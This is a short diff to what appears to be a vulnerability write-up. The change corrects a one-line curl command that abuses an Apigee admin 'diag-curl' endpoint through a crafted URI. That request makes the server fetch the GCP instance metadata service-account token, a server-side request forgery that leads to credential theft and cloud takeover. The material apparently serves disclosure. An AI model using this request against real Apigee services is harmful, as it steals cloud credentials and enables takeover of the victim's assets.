@@ -5,7 +5,7 @@
 **1-Line curl, unauthenticated auttacker could bypass **Cloud Apigee to Full Application and Cloud Asset Takeover**
 
 ```bash
-curl "https://<vulnerable-apigee-service>/<public-api>/<crafted-uri>/<admin-api>diag-curl?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+curl "https://<vulnerable-apigee-service>/<public-api>/<crafted-uri>/<admin-api>/diag-curl?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
 ```
 
 ```bash
